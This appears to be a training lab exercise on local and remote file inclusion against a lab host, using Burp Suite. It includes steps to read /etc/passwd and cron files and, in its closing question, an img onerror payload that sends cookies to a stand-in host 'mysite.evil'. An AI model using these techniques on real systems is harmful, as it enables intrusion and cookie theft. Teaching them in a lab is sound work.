# My First RFI

## Instructions
Use Firefox to navigate to: <http://ptl-08a17b2b-81673f5e.libcurl.so/?page=intro.php>

Enable Foxy Proxy, launch Burp Suite, and intercept a request to the vulnerable page.

Then, follow the instructions below.

---

- Send the request to Repeater. Use the LFI vulnerability to read the contents of the files below. Explain what each file does.
  - `/etc/passwd`
  - `/etc/hosts`
  - `/etc/cron.daily/dpkg`
  - `/etc/cron.weekly/`
  - **Hint**: Try using Intruder!

- Next, inspect the HTML at: <https://gist.githubusercontent.com/Peleke/c86708ff5e888a2614ba904d56ada9d5/raw/f6271aa2b605e639a89bbc48dc0ece7428e84534/Simple%2520HTML>

- Use the RFI vulnerability to load the above site. 
  - What happens? Use `view-source` to verify your answer.

- Inspect the URL at: <https://gist.githubusercontent.com/Peleke/1f02b0833eba6f40ff53aff3d6e3a794/raw/6e25acb31b9f93417a5dbbecbc7d0954c318d3fd/Simple%2520Echo>

- Use the RFI vulnerability to load the above site. Use `view-source` to inspect the result. 
  - Explain why this produces the same result as the first link, even though the snippet is different.

## Questions
- How would you modify the PHP snippet to insert the below image tag?

  ```bash
  <img src="ruhroh" onerror="exfiltrateCookies('mysite.evil')">
  ```
